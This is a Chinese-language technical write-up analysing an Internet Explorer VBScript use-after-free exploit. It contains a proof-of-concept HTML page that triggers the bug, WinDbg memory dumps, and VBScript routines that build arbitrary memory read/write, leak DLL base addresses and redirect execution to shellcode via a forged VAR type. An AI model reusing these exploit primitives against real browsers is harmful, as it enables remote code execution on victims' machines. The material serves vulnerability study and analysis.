
### 构造数组

在`Exploit`中，当执行完`UAF`函数，使用`memclass`函数对释放的内存进行占位。

```text
0:005> dt ole32!tagSAFEARRAY poi(poi(esp+c)+c)
+0x000 cDims : 1
+0x002 fFeatures : 0x892
+0x004 cbElements : 0x10
+0x008 cLocks : 0
+0x00c pvData : 0x0051e630
+0x010 rgsabound : [1] tagSAFEARRAYBOUND
0:005> dd 0x0051e630
0051e630 00000009 00000000 02aa0858 00000000
0051e640 6bcb0009 02aa085c 02aa0858 6bcb4211
0051e650 6bcb0009 02aa085c 02aa0858 6bcb4211
0051e660 6bcb0009 02aa085c 02aa0858 6bcb4211
0051e670 6bcb0009 02aa085c 02aa0858 6bcb4211
0051e680 6bcb0009 02aa085c 02aa0858 6bcb4211
0051e690 6bcb0009 02aa085c 02aa0858 6bcb4211
0051e6a0 3192fbe7 88000000 00000000 00000000
```

下面我们来看下`InitObjects`函数的功能，`SetProp`函数触发`SetProp`的`Public Default Property Get P`函数执行。在此函数中，将`memClass`再次释放，并再次使用`readMemClass`进行占位，并将`hexA`赋值给`readMemClass`的成员变量`mem`，将返回的`P = 174088534690791e-324(00000005 02aa01dc 00000000 0000200c)`复制给`memClass`的成员变量`mem`。因为`readMemClass`和`memClass`的`mem`变量地址相差`0xc`，因此出现了内存重叠。对`memClass`的成员变量`mem`赋值，造成了`readMemClass.mem`的类型变为了一个大小为`0x7FFFFFFF`、每个元素占`1Byte`的`variant`，最终实现任意地址读写。

在执行`InitObjects`函数前，`memClass`的内存布局：

![](upload/attach/201901/771815_Y4TREX8ZQ8HXAQ5.png)

执行完`InitObjects`函数之后，我们来看下内存布局：

```text
0:005> dt ole32!tagSAFEARRAY poi(poi(esp+c)+c)
+0x000 cDims : 1
+0x002 fFeatures : 0x892
+0x004 cbElements : 0x10
+0x008 cLocks : 0
+0x00c pvData : 0x0051e630
+0x010 rgsabound : [1] tagSAFEARRAYBOUND
0:005> dd 0x0051e630
0051e630 02aa0009 00000000 02aa0858 00000000
0051e640 02aa0009 00000000 02aa0858 00000000
0051e650 02aa0009 00000000 02aa0858 00000000
0051e660 02aa0009 00000000 02aa0858 00000000
0051e670 02aa0009 00000000 02aa0858 00000000
0051e680 02aa0009 00000000 02aa0858 00000000
0051e690 02aa0009 00000000 02aa0858 00000000
0051e6a0 3192fbe7 88000000 00000000 00000000
0:005> dd 02aa0858 // readMemClass
02aa0858 6bcb1748 00000001 02aa72d0 0067ea60
02aa0868 000008a8 00000000 00000000 00000000
02aa0878 00000000 0053bac4 00000000 02aa0820
02aa0888 3316580a 8c000000 6bcbce78 6bcc3100
02aa0898 6bcc30f0 00000001 0067ea60 00524150
02aa08a8 00524150 0326ec94 00000000 00000000
02aa08b8 00000000 00000000 33165803 80000000
02aa08c8 6bcb00b1 6bcc3100 6bcc30f0 00000000
0:005> du 0053bac4
0053bac4 "readMemClass"
0:005> dd 02aa72d0
02aa72d0 02aa9578 000000b8 00000100 00000100
02aa72e0 00004000 02aa957c 02aa961c 02aa3018
02aa72f0 0000000f 00000003 00000040 00000003
02aa7300 00000014 00000000 02aa7308 02aa957c
02aa7310 02aa95fc 00000000 00000000 00000000
02aa7320 00000000 00000000 00000000 00000000
02aa7330 00000000 00000000 00000000 00000000
02aa7340 00000000 00000000 00000000 00000000
0:005> dd 02aa95fc-c
02aa95f0 00000005 02aa01dc 00000000 0000200c // P
02aa9600 00000000 0053baec 00000000 00000000
02aa9610 00000000 0000822f 00000006 00000000
02aa9620 00000000 00000003 00000000 0065006d
02aa9630 0000006d 00000000 00000000 00000000
02aa9640 00000000 00000000 00000000 00000000
0:005> dd 0053baec
0053baec 08800001 00000001 00000000 00000000
0053bafc 7fffffff 00000000 00630000 3192b172
0053bb0c 8000003d 00650160 00200077 00650072
0053bb1c 00640061 0065004d 0043006d 0061006c
```

![](upload/attach/201901/771815_RPHGHTJP3PNEJH6.png)

### 获得 DLL 基址

在`Exploit`中，通过相同的方法，将`memClassB.mem`构造成了`vblong`类型用于泄露地址。通过以下方法泄露`CScriptEntryPoint`对象的地址，然后通过对象地址获得`vbs`的基址。通过`VBScript`的导出表获得`msvcrt.dll`的基址，获得`ntdll`的基址，最终获取了`NtContinue`、`VirtualProtect`函数地址。

```vbscript
Function GetMemValue
memClassA.mem(address) = 3
GetMemValue = memClassA.mem(address + 8)
End Function
Sub SetMemValue(ByRef in_Ref)
memClassA.mem(address + 8) = in_Ref
End Sub
Function LeakVBAddr
On Error Resume Next
Dim pCScriptEntryPointObject
pCScriptEntryPointObject = testSub
pCScriptEntryPointObject = null
SetMemValue pCScriptEntryPointObject
LeakVBAddr = GetMemValue()
End Function
```

#### 调试验证

```text
0:005> dd poi(esp+c)
0084f350 00000003 00000000 03b6c06c 00000000
0084f360 02a10003 00595af0 02a17350 1a000218
0084f370 02f3cdc4 0084f3a0 0084f380 1a000218
0084f380 00000001 00000080 02a17350 1a000218
0084f390 00000000 00000000 02a18608 00000000
0084f3a0 02f3d008 02f3c0 02a10694 00000000
0084f3b0 02f30000 0084f4c0 00000000 00000000
0084f3c0 02f3d24c 0084f4c0 02a18608 00000000
0:005> dd 03b6c06c
03b6c06c 00000002 7771e026 02a10003 00595af0
03b6c07c 02a17350 1a000218 00000000 2d1edd67
03b6c08c 80000000 00000020 00000000 00000000
03b6c09c 00000000 00000000 00000000 00000000
03b6c0ac 00000000 2d1edd60 80000000 00000025
03b6c0bc 00000000 00000000 00000000 00000000
03b6c0cc 00000000 00000000 00000000 2d1edd6d
03b6c0dc 80000000 0000002a 00000000 00000000
0:005> ln poi(02a17350)
(70b44934) vbscript!CScriptEntryPoint::`vftable' | (70b5ab54) vbscript!CEntryPointDispatch::`vftable'
Exact matches:
vbscript!CScriptEntryPoint::`vftable' = <no type information>
```

```vbscript
Function GetBaseByDOSmodeSearch(in_addr)
Dim addr
addr = in_addr And &hFFFF0000
Do While GetUint32(addr+&h68)<>&h206E6920 Or GetUint32(addr+&h6C)<>&h20534F44 // in DOS
addr = addr-&h10000
Loop
IsEmpty(addr)
GetBaseByDOSmodeSearch = addr
End Function
```

### 获取指定地址的内存数据

`Exploit`通过如下的方法获得执行参数的地址内存数据，将`address`指向的内存混淆成`bstr`，通过`lenB`获得该地址前`4`个字节的数据。

```vbscript
Function GetUint32(Addr)
Dim value
memClassA.mem(address + 8) = Addr + 4
memClassA.mem(address) = 8 ' type string
value = memClassA.P0123456789
memClassA.mem(address) = 2
GetUint32 = value
End Function
```

### ShellCode 执行

`Exploit`中，通过和获得关键 DLL 基址同样的手法，获得`shellCode`地址，然后构建`ROP`链，通过精心控制使代码执行`ntdll!ZwContinue`函数。然后利用任意读写的手段修改某个`VAR`的`type`类型为`0x4d`，再赋值为`0`，让虚拟机执行`VAR::Clear`函数，最终实现`shellcode`执行。

```vbscript
Sub ExecuteShellcode
memClassA.mem(address) = &h4d
memClassA.mem(address + 8) = 0
End Sub
```

之前在 IE [VBScript 漏洞之 CVE-2014-6332](https://bbs.pediy.com/thread-248925.htm)中，总结学习了 VBScript 中的关键数据结构，故在这篇中不再总结。如果错误，请指正，谢谢。

### 漏洞分析

### POC

启用页堆：

```cmd
gflags.exe /i iexplore.exe +hpa
```

```html
<!doctype html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="x-ua-compatible" content="IE=10">
<meta http-equiv="Expires" content="0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-control" content="no-cache">
<meta http-equiv="Cache" content="no-cache">
<body>
<script language="vbscript">
Dim array()
Dim array2(1)

Class MyClass
    Private Sub Class_Terminate
        Set array2(0) = array(1)
        array(1) = 1
    End Sub
End Class

Redim array(1)
Set array(1) = New MyClass
Erase array
array2(0) = 0
</script>
</body>
</html>
```

捕获异常如下。我们可以看到`eax`引用的地址已经被释放了，也就是对应`POC`中的`Erase array`。调用`Erase`触发了`Class_Terminate`函数，在`Class_Terminate`函数中，将`array(1)`赋值给了`array2`，然后又平衡了其引用计数，使得`array2`成了指向`MyClass`的悬挂指针，访问`array2`造成了访问异常。

```text
First chance exceptions are reported before any exception handling.

This exception may be expected and handled.

eax=0c607fd0 ebx=0aa8af90 ecx=00000009 edx=00000002 esi=0aa8af90 edi=00000009

eip=75a24971 esp=08aadf7c ebp=08aadf84 iopl=0         nv up ei pl nz na po nc

cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202

OLEAUT32!VariantClear+0xb3:

75a24971 8b08            mov     ecx,dword ptr [eax]  ds:002b:0c607fd0=????????

0:005> !heap -p -a eax

    address 0c607fd0 found in

    _DPH_HEAP_ROOT @ a31000

    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)

                                     a33618:          c607000             2000

    6d9c90b2 verifier!AVrfDebugPageHeapFree+0x000000c2

    77e70acc ntdll!RtlDebugFreeHeap+0x0000002f

    77e2a967 ntdll!RtlpFreeHeap+0x0000005d

    77dd32f2 ntdll!RtlFreeHeap+0x00000142

    772c98cd msvcrt!free+0x000000cd // eax所指向的内存已经被释放掉了

    6bc2406c vbscript!VBScriptClass::`vector deleting destructor'+0x00000019

    6bc2411a vbscript!VBScriptClass::Release+0x00000043

    75a24977 OLEAUT32!VariantClear+0x000000b9

    75a3e375 OLEAUT32!ReleaseResources+0x000000a3

    75a3e003 OLEAUT32!_SafeArrayDestroyData+0x00000048

    75a45d7d OLEAUT32!SafeArrayDestroyData+0x0000000f

    75a45d63 OLEAUT32!Thunk_SafeArrayDestroyData+0x00000039

    6bc6267f vbscript!VbsErase+0x00000057

    ······
```

### 调试
